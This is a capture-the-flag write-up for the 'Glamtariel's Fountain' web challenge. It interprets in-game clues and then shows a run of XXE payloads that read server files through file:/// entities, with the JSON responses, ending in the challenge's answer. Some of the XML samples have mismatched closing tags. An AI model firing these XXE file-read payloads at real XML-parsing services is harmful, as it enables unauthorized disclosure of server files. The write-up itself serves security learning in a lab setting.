

# Glamtariels Fountains

STATUS: NOT DONE

## Hints

```
Significant CASE
From: Hal Tandybuck
Objective: Glamtariel's Fountain
Early parts of this challenge can be solved by focusing on Glamtariel's WORDS.
```

```
eXternal Entities
From: Hal Tandybuck
Objective: Glamtariel's Fountain
Sometimes we can hit web pages with XXE when they aren't expecting it!
```

## Clues

The dialoge for this game gives you various clues to solve this challenge. Clues found:

* TAMPER 
* TRAFFIC FLIES
* PATH
* APP
* TYPE
* SIMPLE FORMAT

## Important notes

### Strategy

From the hints we see this challenge is divided in two parts

1. Make sense of the clues
2. Usae XXE

#### Make sense of the clues

| Clue 			 | Text from game | Meaning |
| -------------- | -------------- | ------- |
| TAMPER         | Kringle really dislikes if anyone tries to TAMPER with the cookie recipe Glamtariel uses| | |
|       	         | I don't know why anyone would ever ask me to TAMPER with cookie recipe. I know just how Kringle likes them. | | |
| TRAFFIC FLIES  | From water and cold new ice form Frozen spires from lakes will arise. Those shivering who weather the storm will learn from how the TRAFFIC FLIES| Look at network traffic to see what is served from where. | 
| PATH           | I helped the elves create the PATH here to make sure that only those invited can find their way here.  | | 
|                | The elves do a great job making PATHs which are easy to follow once you see them  | |  
|                | Careful with the mountain! I know what you were wondering about there. It's no cause for concern. The PATH here is closed  | |       
| APP            | Between Glamtariel and Kringle, many who have tried to find the PATH here uninvited have ended up very disAPPpointed. Please click away that ominous eye!| | 
| TYPE           | Did you know that I speak many TYPEs of languages? For simplicity, I usually only communicate with this one though | |
|                | I pretty much stick to just one TYPE of language, it's a lot easier to share things that way | |
|                | You know, I've heard Glamtariel talk in her sleep about rings using a different TYPE of language. She may be more responsive about them if you ask differently. | |
| SIMPLE FORMAT  | I like to keep track of all my rings using a SIMPLE FORMAT, although I usually don't like to discuss such things | |
| RINGLIST       | Wow!, what a beautiful silver ring! I don't have one of these. I keep a list of all my rings in my RINGLIST file. Wait a minute! Uh, promise me you won't tell anyone. | |
|                | I never heard Glamtariel mention a RINGLIST file before. If only there were a way to get a peek at that. | | |


##### Traffic Flies

/static/js/images-1.js
/static/images/starrybackground.png
/static/images/2022_glamtariel_2022.png
/static/images/img1-1671256015953.png
/dropped
/static/images/stage2ring-eyecu_2022.png
/static/images/grinchum-supersecret_9364274.png


## Solving

The stink/evil eye seems to play a vital role

![Payment done](/img/web-ring/glamtariel-1.png)

And so do these rings

![Payment done](/img/web-ring/glamtariel-2.png)

If we pass requests to /dropped through BurpSuite Proxy then to Repeater we get






--------- 

POST request 

```xml
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///app/static/images/ringlist.txt" >]>
<bleh>
<imgDrop>&xxe;</imgDrop>
<who>princess</who>
<reqType>xml</who>
</bleh>
```

Even though we send the request in XML, we get answer back in JSON

```json
{
  "appResp": "Ah, you found my ring list! Gold, red, blue - so many colors! Glad I don't keep any secrets in it any more! Please though, don't tell anyone about this.^She really does try to keep things safe. Best just to put it away. (click)",
  "droppedOn": "none",
  "visit": "static/images/pholder-morethantopsupersecret63842.png,262px,100px"
}
```

This tell me to pay a visit to pholder-morethantopsupersecret63842.png, which is:

![Secret image](/img/web-ring/pholder-morethantopsupersecret63842.png)

The picture shows a folder **x_phial_pholder_2022/greenring.txt** and two file, bluering.txt and redring.txt.

```xml
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///app/static/images/x_phial_pholder_2022/redring.txt" >]>
<bleh>
<imgDrop>&xxe;</imgDrop>
<who>princess</who>
<reqType>xml</who>
</bleh>
```

Response

```json
{
  "appResp": "Hmmm, you still seem awfully interested in these rings. I can't blame you, they are pretty nice.^Oooooh, I can just tell she'd like to talk about them some more.",
  "droppedOn": "none",
  "visit": "none"
}
```

Hmmm nothing much. Trying blue ring

```xml
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///app/static/images/x_phial_pholder_2022/bluering.txt" >]>
<bleh>
<imgDrop>&xxe;</imgDrop>
<who>princess</who>
<reqType>xml</who>
</bleh>
```

Response

```json
{
  "appResp": "I love these fancy blue rings! You can see we have two of them. Not magical or anything, just really pretty.^She definitely tries to convince everyone that the blue ones are her favorites. I'm not so sure though.",
  "droppedOn": "none",
  "visit": "none"
}
```

Trying silver ring

```xml
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///app/static/images/x_phial_pholder_2022/silverring.txt" >]>
<bleh>
<imgDrop>&xxe;</imgDrop>
<who>princess</who>
<reqType>xml</who>
</bleh>
```

Response

```json
{
  "appResp": "I'd so love to add that silver ring to my collection, but what's this? Someone has defiled my red ring! Click it out of the way please!.^Can't say that looks good. Someone has been up to no good. Probably that miserable Grinchum!",
  "droppedOn": "none",
  "visit": "static/images/x_phial_pholder_2022/redring-supersupersecret928164.png,267px,127px"
}
```

![Secret red ring](/img/web-ring/redring-supersupersecret928164.png)

Inside the ring we find the inscription: "goldring_to_be_deleted.txt". Trying to access this text file:

```xml

<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///app/static/images/x_phial_pholder_2022/goldring_to_be_deleted.txt" >]>
<bleh>
<imgDrop>&xxe;</imgDrop>
<who>princess</who>
<reqType>xml</who>
</bleh>
```

Which returns

```json
{
  "appResp": "Hmmm, and I thought you wanted me to take a look at that pretty silver ring, but instead, you've made a pretty bold REQuest. That's ok, but even if I knew anything about such things, I'd only use a secret TYPE of tongue to discuss them.^She's definitely hiding something.",
  "droppedOn": "none",
  "visit": "none"
}
```

This response hints at "bold REQuest" and "TYPE" - combined it spells out "REQTYPE". Oh. That tag, yes. It really hints to put the XXE inside that tag: 

```xml
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///app/static/images/x_phial_pholder_2022/goldring_to_be_deleted.txt" >]>
<bleh>
<imgDrop>img1</imgDrop>
<who>princess</who>
<reqType>&xxe;</who>
</bleh>
```

response

```json
{
  "appResp": "No, really I couldn't. Really? I can have the beautiful silver ring? I shouldn't, but if you insist, I accept! In return, behold, one of Kringle's golden rings! Grinchum dropped this one nearby. Makes one wonder how 'precious' it really was to him. Though I haven't touched it myself, I've been keeping it safe until someone trustworthy such as yourself came along. Congratulations!^Wow, I have never seen that before! She must really trust you!",
  "droppedOn": "none",
  "visit": "static/images/x_phial_pholder_2022/goldring-morethansupertopsecret76394734.png,200px,290px"
}
```

Visiting that image yield

![Gold ring](/img/web-ring/goldring-morethansupertopsecret76394734.png)

However, the answer to this objective is **goldring-morethansupertopsecret76394734.png**